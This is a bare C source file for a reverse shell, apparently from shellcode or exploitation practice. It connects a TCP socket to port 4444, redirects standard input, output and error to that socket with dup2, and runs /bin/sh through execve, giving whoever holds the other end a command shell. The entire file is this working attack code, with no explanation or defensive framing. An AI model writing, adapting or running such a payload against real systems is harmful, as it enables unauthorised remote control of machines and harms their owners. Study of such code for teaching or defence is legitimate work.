#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>

int main() {
        int sockfd;
        struct sockaddr_in servSA;

        servSA.sin_family = AF_INET;
        servSA.sin_port = htons(4444);
        servSA.sin_addr.s_addr = INADDR_ANY;
        memset(servSA.sin_zero, '\0', sizeof servSA.sin_zero);

        char *arg_list[] = { { "/bin/sh" }, NULL };
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        connect(sockfd, (struct sockaddr *)&servSA, sizeof servSA);

        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

        execve(arg_list[0], arg_list, arg_list[1]);
        return 0;
}
